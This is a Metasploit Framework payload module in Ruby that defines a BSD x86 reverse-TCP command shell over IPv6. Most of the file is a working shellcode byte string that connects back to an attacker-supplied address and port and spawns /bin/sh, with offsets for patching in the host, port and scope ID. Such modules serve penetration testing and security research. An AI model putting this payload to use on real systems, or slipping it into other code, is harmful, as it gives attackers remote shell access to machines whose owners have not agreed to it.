##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Bsd
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcp'

  #
  # Methods
  #

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD Command Shell, Reverse TCP Inline (IPv6)',
      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',
      'Author'        => [ 'skape', 'vlad902', 'hdm' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X86,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LHOST'    => [ 42, 'ADDR6' ],
              'LPORT'    => [ 36, 'n'    ],
              'SCOPEID'  => [ 58, 'V'    ]
            },
          'Payload' =>
            "\x31\xc0\x50\x40\x50\x6a\x1c\x6a\x61\x58\x50\xcd\x80\xeb\x0e\x59" +
            "\x6a\x1c\x51\x50\x97\x6a\x62\x58\x50\xcd\x80\xeb\x21\xe8\xed\xff" +
            "\xff\xff\x1c\x1c\xbf\xbf\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
            "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x6a\x02" +
            "\x59\xb0\x5a\x51\x57\x51\xcd\x80\x49\x79\xf6\x50\x68\x2f\x2f\x73" +
            "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd\x80"
        }
    ))
    register_options([
      OptInt.new('SCOPEID', [false, "IPv6 scope ID, for link-local addresses", 0])
    ])
  end

end
